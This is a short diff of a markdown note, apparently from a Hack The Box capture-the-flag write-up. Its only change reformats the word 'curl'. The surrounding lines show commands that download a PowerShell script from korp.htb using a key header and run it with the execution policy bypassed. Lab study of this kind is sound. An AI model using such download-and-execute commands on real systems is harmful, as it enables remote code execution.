@@ -12,7 +12,7 @@ Invoke-WebRequest -Uri "http://korp.htb:53673/a541a" -Headers @{"X-ST4G3R-KEY"="
 ```
 ### **Using `curl` (Linux/macOS/Windows)**
 
-On Linux or Windows (with WSL), use `curl`:
+On Linux or Windows (with WSL), use [[curl]]:
 
 ```
 curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" -o a541a.ps1 http://korp.htb:53673/a541a powershell -exec Bypass -File "a541a.ps1"
